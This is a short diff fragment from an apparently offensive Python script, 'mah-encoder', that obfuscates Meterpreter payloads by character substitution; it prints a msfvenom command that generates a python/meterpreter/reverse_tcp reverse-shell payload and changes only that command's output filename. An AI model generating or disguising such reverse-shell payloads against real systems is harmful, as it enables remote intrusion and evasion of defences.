@@ -7,7 +7,7 @@ def cool_banner_print(text="banner"):
 cool_banner_print("mah-encoder")
 print(colored("please using payload: python/meterpreter/reverse_tcp", "yellow"))
 print("The interactive mode has not been made yet. If done, it will most likely be a module to the mah-framework.\n let me know. Greetings and respect to the commander.\n Sometimes the encoder makes 'c' to 'd' due to a compilation error in my msphenom, but normally it's fine.","red")
-print("msfvenom -p python/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o localhost_4444_payload.txt")
+print("msfvenom -p python/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o lhost_4444_payload.txt")
 def rep(text):
     text = text.replace("A"  , "/-1-/")
     text = text.replace("a"  , "/-2-/")
